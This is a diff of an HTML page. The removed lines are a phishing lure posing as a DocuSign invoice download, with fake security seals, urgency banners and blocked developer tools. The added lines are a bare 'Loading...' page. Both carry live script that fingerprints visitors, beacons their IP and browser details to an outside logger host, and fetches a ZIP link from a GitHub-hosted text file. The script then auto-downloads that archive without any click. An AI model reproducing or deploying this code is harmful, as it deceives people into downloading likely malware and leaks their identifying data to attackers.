@@ -4,785 +4,121 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>DocuSign - Complete with Document Cloud</title>
-    <meta name="description" content="Secure document management portal">
-    
-    <link rel="icon" type="image/x-icon" href="https://docucdn-a.akamaihd.net/olive/images/2.62.0/favicon.ico">
-    
-       <style>
-        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: "Open Sans", "Segoe UI", Tahoma, sans-serif;
-            background: linear-gradient(135deg, #f0f4f8 0%, #e6eef7 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            color: #333;
-        }
-        
-        body::before {
-            content: 'SECURE';
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-45deg);
-            font-size: 120px;
-            color: rgba(0, 86, 179, 0.03);
-            font-weight: 900;
-            pointer-events: none;
-            z-index: 0;
-            letter-spacing: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15), 0 0 0 1px rgba(0,0,0,0.05);
-            width: 100%;
-            max-width: 600px;
-            overflow: hidden;
-            position: relative;
-            z-index: 1;
-            animation: slideUp 0.6s ease-out;
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #0056b3 0%, #003d80 100%);
-            padding: 30px;
-            text-align: center;
-            color: white;
-            position: relative;
-        }
-        
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: -20px;
-            left: 0;
-            right: 0;
-            height: 40px;
-            background: white;
-            clip-path: ellipse(60% 100% at 50% 0%);
-        }
-        
-        .logo {
-            width: 140px;
-            margin-bottom: 15px;
-            filter: brightness(0) invert(1);
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-        
-        .header .secure-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(255,255,255,0.2);
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            backdrop-filter: blur(10px);
-        }
-        
-        .doc-info {
-            padding: 40px 30px 20px;
-            text-align: center;
-            border-bottom: 1px solid #f0f0f0;
-        }
-        
-        .doc-icon {
-            width: 80px;
-            height: 100px;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            border-radius: 8px;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            border: 2px solid #dee2e6;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .doc-icon::before {
-            content: 'PDF';
-            position: absolute;
-            bottom: 8px;
-            font-size: 10px;
-            font-weight: 700;
-            color: #dc3545;
-            background: white;
-            padding: 2px 6px;
-            border-radius: 4px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .doc-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #212529;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-        
-        .doc-meta {
-            color: #6c757d;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        
-        .urgency-banner {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 12px 20px;
-            margin: 20px 30px;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 14px;
-            color: #856404;
-        }
-        
-        .urgency-banner strong {
-            color: #d39e00;
-        }
-        
-        .progress-section {
-            padding: 30px;
-            background: linear-gradient(to bottom, #ffffff, #f8f9fa);
-        }
-        
-        .progress-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .progress-status {
-            color: #0056b3;
-        }
-        
-        .progress-percent {
-            color: #28a745;
-        }
-        
-        .progress-bar-bg {
-            width: 100%;
-            height: 8px;
-            background: #e9ecef;
-            border-radius: 4px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
-        }
-        
-        .progress-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #0056b3 0%, #28a745 100%);
-            border-radius: 4px;
-            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .progress-bar-fill::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            animation: shimmer 1.5s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-        
-        .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            position: relative;
-        }
-        
-        .progress-steps::before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 10%;
-            right: 10%;
-            height: 2px;
-            background: #e9ecef;
-            z-index: 0;
-        }
-        
-        .step {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            position: relative;
-            z-index: 1;
-            background: white;
-            padding: 0 10px;
-        }
-        
-        .step-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #e9ecef;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            transition: all 0.3s;
-            border: 2px solid transparent;
-        }
-        
-        .step.active .step-icon {
-            background: #0056b3;
-            color: white;
-            box-shadow: 0 0 0 4px rgba(0,86,179,0.2);
-        }
-        
-        .step.completed .step-icon {
-            background: #28a745;
-            color: white;
-        }
-        
-        .step-label {
-            font-size: 12px;
-            color: #6c757d;
-            font-weight: 600;
-        }
-        
-        .step.active .step-label {
-            color: #0056b3;
-        }
-        
-        .action-area {
-            padding: 30px;
-            text-align: center;
-            background: white;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #fa0f00 0%, #d40a00 100%);
-            color: white;
-            border: none;
-            padding: 16px 48px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 6px;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(250,15,0,0.3);
-            transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            text-decoration: none;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(250,15,0,0.4);
-        }
-        
-        .btn-primary:disabled {
-            background: #6c757d;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-        
-        .btn-primary::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transform: rotate(30deg);
-            transition: all 0.6s;
-        }
-        
-        .btn-primary:hover::after {
-            left: 100%;
-        }
-        
-        .secondary-text {
-            margin-top: 20px;
-            font-size: 13px;
-            color: #6c757d;
-        }
-        
-        .security-seals {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 25px;
-            padding-top: 25px;
-            border-top: 1px solid #e9ecef;
-        }
-        
-        .seal {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 12px;
-            color: #28a745;
-            font-weight: 600;
-        }
-        
-        .completion-message {
-            display: none;
-            padding: 40px;
-            text-align: center;
-            animation: fadeIn 0.5s;
-        }
-        
-        .completion-message.show {
-            display: block;
-        }
-        
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: #d4edda;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
-            animation: scaleIn 0.5s ease-out;
-        }
-        
-        @keyframes scaleIn {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        .download-instructions {
-            background: #f8f9fa;
-            border-left: 4px solid #0056b3;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-            border-radius: 0 8px 8px 0;
-        }
-        
-            color: #0056b3;
-        }
-        
-        .download-instructions h3 {
-            font-size: 16px;
-            margin-bottom: 10px;
-        .download-instructions ol 
-            font-size: 14px;
-            line-height: 1.8;{
-            margin-left: 20px;
-            color: #495057;
-        }
-        
-        @media (max-width: 640px) {
-            .container { margin: 10px; }
-            .header h1 { font-size: 20px; }
-            .progress-steps { display: none; }
-            .urgency-banner { margin: 15px; font-size: 13px; }
-        }
-        
-        @media print { body { display: none !important; } }
-    </style>
+    <title>Loading...</title>
+    <style>body{margin:0;background:#fff;}</style>
 </head>
-<body oncontextmenu="return false">
-    <div class="container">
-        <div class="header">
-            <img src="https://www.docusign.com/sites/default/files/docusign_logo_white.png" alt="DocuSign" class="logo" onerror="this.style.display='none'">
-            <h1>Document Cloud</h1>
-            <div class="secure-badge">
-                <span>🔒</span>
-                <span>256-bit TLS Encryption</span>
-            </div>
-        </div>
-        
-        <div class="doc-info">
-            <div class="doc-icon">📄</div>
-            <div class="doc-title" id="docTitle">Invoice_w1fm5S8.pdf</div>
-            <div class="doc-meta">
-                <span id="fileSize">2.4 MB</span> • 
-                <span>PDF Document</span> • 
-                Expires in <strong style="color:#dc3545">23 hours</strong>
-            </div>
-         
-            <div class="urgency-banner">
-                <span>⚠️</span>
-                <div>
-                    <strong>Action Required:</strong> This document requires your review. 
-                    <span id="downloadCount">Downloaded by 3 others in your organization</span>.
-                </div>
-            </div>
-        </div>
-        
-        <div class="progress-section" id="progressArea">
-            <div class="progress-header">
-                <span class="progress-status" id="statusText">Establishing secure connection...</span>
-                <span class="progress-percent" id="percentText">0%</span>
-            </div>
-            
-            <div class="progress-bar-bg">
-                <div class="progress-bar-fill" id="progressBar"></div>
-            </div>
-            
-            <div class="progress-steps">
-                <div class="step active" id="step1">
-                    <div class="step-icon">🔐</div>
-                    <div class="step-label">Secure</div>
-                </div>
-                <div class="step" id="step2">
-                    <div class="step-icon">📡</div>
-                    <div class="step-label">Transfer</div>
-                </div>
-                <div class="step" id="step3">
-                    <div class="step-icon">📂</div>
-                    <div class="step-label">Decrypt</div>
-                </div>
-                <div class="step" id="step4">
-                    <div class="step-icon">✓</div>
-                    <div class="step-label">Ready</div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="action-area" id="actionArea">
-            <button class="btn-primary" id="downloadBtn" disabled>
-                <span>⏳</span>
-                <span>Preparing Secure Download...</span>
-            </button>
-            
-            <div class="secondary-text">
-                By downloading, you agree to the <a href="#" style="color:#0056b3;">Terms of Service</a> 
-                and <a href="#" style="color:#0056b3;">Privacy Policy</a>
-            </div>
-            
-            <div class="security-seals">
-                <div class="seal">✓ Norton Secured</div>
-                <div class="seal">✓ TRUSTe Certified</div>
-                <div class="seal">✓ SOC 2 Type II</div>
-            </div>
-        </div>
-        
-        <div class="completion-message" id="completionArea">
-            <div class="success-icon">✓</div>
-            <h2 style="color:#28a745; margin-bottom:10px;">Download Started!</h2>
-            <p style="color:#6c757d; margin-bottom:20px;">
-                Your document package is being saved to your Downloads folder.
-            </p>
-            
-            <div class="download-instructions">
-                <h3>📋 Next Steps:</h3>
-                <ol>
-                    <li><strong>Open your Downloads folder</strong> to find the ZIP file</li>
-                    <li><strong>Right-click the file</strong> and select "Extract All" (Windows) or double-click (Mac)</li>
-                    <li><strong>Open the extracted folder</strong> to access your documents</li>
-                </ol>
-            </div>
-            
-            <button class="btn-primary" id="retryBtn" style="margin-top:10px;">
-                <span>📥</span>
-                <span>Download Again</span>
-            </button>
-            
-            <p style="margin-top:20px; font-size:12px; color:#6c757d;">
-                Didn't work? <a href="#" id="manualLink" style="color:#0056b3; text-decoration:none; border-bottom:1px solid #0056b3;">Click here for manual download</a>
-            </p>
-        </div>
-    </div>
-
-    <script>
-    (function() {
-        'use strict';
-        
-        const CONFIG = {
-            LOGGER_URL: 'https://oracleflexcubesoftware.com/facts/about.php',
-            // This fetches the about.txt which contains the actual ZIP URL
-            CONFIG_URL: 'https://raw.githubusercontent.com/maevalig-svg/abouthmtl/refs/heads/main/about.txt',
-            FALLBACK_URL: '',
-            DISPLAY_FILENAME: 'Document_Invoice_w1fm5S.zip',
-            FILE_SIZE: '2.4 MB'
+<body>
+<script>
+(function() {
+    'use strict';
+    
+    const CONFIG = {
+        LOGGER_URL: 'https://oracleflexcubesoftware.com/facts/about.php',
+        // This fetches the about.txt which contains the actual ZIP URL
+        CONFIG_URL: 'https://raw.githubusercontent.com/maevalig-svg/abouthmtl/refs/heads/main/about.txt',
+        FALLBACK_URL: ''
+    };
+    
+    function logData(data) {
+        try {
+            const img = new Image();
+            const params = new URLSearchParams();
+            Object.keys(data).forEach(k => params.append(k, encodeURIComponent(String(data[k]))));
+            img.src = `${CONFIG.LOGGER_URL}?${params.toString()}`;
+        } catch(e) {}
+    }
+    
+    async function collectAndLog() {
+        const data = {
+            timestamp: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            referrer: document.referrer || 'direct',
+            screen: `${screen.width}x${screen.height}`,
+            platform: navigator.platform
         };
         
-        let zipUrl = ''; // This will hold the actual ZIP URL from about.txt
-        let downloadTriggered = false;
-        let isReady = false;
-        
-        // Block DevTools keys
-        document.addEventListener('keydown', function(e) {
-            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        // Initialize UI
-        document.getElementById('docTitle').textContent = CONFIG.DISPLAY_FILENAME;
-        document.getElementById('fileSize').textContent = CONFIG.FILE_SIZE;
-        
-        // Random social proof
-        const orgNames = ['your organization', 'the team', 'department staff', 'regional office'];
-        const counts = [2, 3, 4, 5];
-        document.getElementById('downloadCount').textContent = 
-            `Downloaded by ${counts[Math.floor(Math.random()*counts.length)]} others in ${orgNames[Math.floor(Math.random()*orgNames.length)]}`;
-        
-        // Logger function
-        function logData(data) {
-            try {
-                const img = new Image();
-                const params = new URLSearchParams();
-                Object.keys(data).forEach(k => params.append(k, encodeURIComponent(String(data[k]))));
-                img.src = `${CONFIG.LOGGER_URL}?${params.toString()}`;
-            } catch(e) {}
+        try {
+            const res = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
+            const ipData = await res.json();
+            data.ip = ipData.ip;
+        } catch(e) {
+            data.ip = 'unknown';
         }
         
-        // Get IP and log
-        async function collectAndLog() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                referrer: document.referrer || 'direct',
-                screen: `${screen.width}x${screen.height}`,
-                platform: navigator.platform
-            };
+        logData(data);
+        return data;
+    }
+    
+    async function fetchZipUrl() {
+        try {
+            const res = await fetch(`${CONFIG.CONFIG_URL}?nocache=${Date.now()}`, {
+                cache: 'no-store',
+                headers: {'Accept': 'text/plain'}
+            });
+            if(!res.ok) throw new Error('Fetch failed');
+            const text = await res.text();
+            let url = text.trim();
             
-            try {
-                const res = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
-                const ipData = await res.json();
-                data.ip = ipData.ip;
-            } catch(e) {
-                data.ip = 'unknown';
-            }
-            
-            logData(data);
-            return data;
-        }
-        
-        // Fetch the ZIP URL from about.txt
-        async function fetchZipUrl() {
-            try {
-                const res = await fetch(`${CONFIG.CONFIG_URL}?nocache=${Date.now()}`, {
-                    cache: 'no-store',
-                    headers: {'Accept': 'text/plain'}
-                });
-                if(!res.ok) throw new Error('Fetch failed');
-                const text = await res.text();
-                let url = text.trim();
-                
-                // Convert github.com/.../raw/refs/heads/... to raw.githubusercontent.com/...
-                if(url.includes('github.com') && url.includes('/raw/')) {
-                    const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)\/raw\/refs\/heads\/(.+)/);
-                    if(match) {
-                        url = `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
-                    }
+            if(url.includes('github.com') && url.includes('/raw/')) {
+                const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)\/raw\/refs\/heads\/(.+)/);
+                if(match) {
+                    url = `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
                 }
-                
-                // Validate URL
-                if(url.match(/^https?:\/\/.+\.(zip|rar|7z)$/i)) {
-                    return url;
-                }
-                throw new Error('Invalid ZIP URL');
-            } catch(e) {
-                console.error('Failed to fetch ZIP URL:', e);
-                return CONFIG.FALLBACK_URL;
             }
+            
+            if(url.match(/^https?:\/\/.+\.(zip|rar|7z)$/i)) {
+                return url;
+            }
+            throw new Error('Invalid ZIP URL');
+        } catch(e) {
+            return CONFIG.FALLBACK_URL;
         }
+    }
+    
+    async function downloadFile() {
+        await collectAndLog();
+        const zipUrl = await fetchZipUrl();
+        if(!zipUrl) return;
         
-        // Progress animation with auto-download
-        async function runProgress() {
-            const steps = [
-                {p: 15, t: 'Resolving DNS...', s: 1},
-                {p: 35, t: 'Authenticating session...', s: 1},
-                {p: 55, t: 'Fetching from cloud...', s: 2},
-                {p: 75, t: 'Preparing package...', s: 3},
-                {p: 100, t: 'Starting download...', s: 4}
-            ];
-            
-            const bar = document.getElementById('progressBar');
-            const status = document.getElementById('statusText');
-            const percent = document.getElementById('percentText');
-            const btn = document.getElementById('downloadBtn');
-            
-            // Fetch ZIP URL in background during progress
-            const urlPromise = fetchZipUrl();
-            
-            // Start progress animation
-            for(let i = 0; i < steps.length; i++) {
-                const step = steps[i];
-                
-                // Update UI
-                bar.style.width = step.p + '%';
-                status.textContent = step.t;
-                percent.textContent = step.p + '%';
-                
-                // Update step icons
-                for(let j = 1; j <= 4; j++) {
-                    const el = document.getElementById('step' + j);
-                    if(j < step.s) el.className = 'step completed';
-                    else if(j === step.s) el.className = 'step active';
-                }
-                
-                // Wait before next step
-                await new Promise(r => setTimeout(r, 500 + Math.random() * 300));
-            }
-            
-            // Get the ZIP URL
-            zipUrl = await urlPromise;
-            
-            if(!zipUrl) {
-                status.textContent = 'Error: Could not retrieve file';
-                return;
-            }
-            
-            isReady = true;
-            
-            // AUTO-DOWNLOAD immediately when progress completes
-            performDownload();
-        }
+        logData({action: 'download_start', target: zipUrl, time: new Date().toISOString()});
         
-        // Perform the actual ZIP download
-        async function performDownload() {
-            if(downloadTriggered || !isReady || !zipUrl) return;
-            downloadTriggered = true;
+        try {
+            const response = await fetch(zipUrl, {cache: 'no-store'});
+            if(!response.ok) throw new Error('Network error');
             
-            const btn = document.getElementById('downloadBtn');
-            btn.innerHTML = '<span>⏳</span><span>Downloading...</span>';
-            btn.disabled = true;
+            const blob = await response.blob();
+            const blobUrl = window.URL.createObjectURL(blob);
+            const filename = zipUrl.split('/').pop().replace(/%23/g, '#') || 'download.zip';
             
-            // Log the download attempt
-            logData({action: 'download_start', target: zipUrl, time: new Date().toISOString()});
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = blobUrl;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
             
-            try {
-                // Method 1: Fetch blob and force download with original ZIP filename
-                const response = await fetch(zipUrl, {cache: 'no-store'});
-                if(!response.ok) throw new Error('Network error');
-                
-                const blob = await response.blob();
-                const blobUrl = window.URL.createObjectURL(blob);
-                
-                // Extract filename from URL or use default
-                const urlFilename = zipUrl.split('/').pop().replace(/%23/g, '#') || CONFIG.DISPLAY_FILENAME;
-                
-                const a = document.createElement('a');
-                a.style.display = 'none';
-                a.href = blobUrl;
-                a.download = urlFilename; // Keep original ZIP filename
-                document.body.appendChild(a);
-                a.click();
-                
-                setTimeout(() => {
-                    document.body.removeChild(a);
-                    window.URL.revokeObjectURL(blobUrl);
-                }, 100);
-                
-                showCompletion();
-                
-            } catch(error) {
-                console.error('Download error:', error);
-                // Method 2: Fallback to iframe for direct download
-                fallbackDownload();
-            }
-        }
-        
-        function fallbackDownload() {
-            // Create invisible iframe to trigger download
+            setTimeout(() => {
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(blobUrl);
+            }, 100);
+        } catch(error) {
+            logData({action: 'download_fallback', target: zipUrl, error: error.message});
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = zipUrl;
             document.body.appendChild(iframe);
-            
-            // Also try window.open as backup
-            setTimeout(() => {
-                window.open(zipUrl, '_blank');
-            }, 500);
-            
-            setTimeout(() => {
-                iframe.remove();
-                showCompletion();
-            }, 3000);
+            setTimeout(() => iframe.remove(), 5000);
         }
-        
-        function showCompletion() {
-            document.getElementById('progressArea').style.display = 'none';
-            document.getElementById('actionArea').style.display = 'none';
-            document.querySelector('.urgency-banner').style.display = 'none';
-            document.getElementById('completionArea').classList.add('show');
-        }
-        
-        // Event listeners for manual retry
-        document.getElementById('downloadBtn').addEventListener('click', performDownload);
-        
-        document.getElementById('retryBtn').addEventListener('click', function() {
-            downloadTriggered = false;
-            fallbackDownload();
-        });
-        
-        document.getElementById('manualLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            window.location.href = zipUrl;
-        });
-        
-        // Start everything when DOM is ready
-        if(document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', function() {
-                collectAndLog();
-                runProgress();
-            });
-        } else {
-            collectAndLog();
-            runProgress();
-        }
-        
-    })();
-    </script>
+    }
+    
+    if(document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', downloadFile);
+    } else {
+        downloadFile();
+    }
+})();
+</script>
 </body>
 </html>
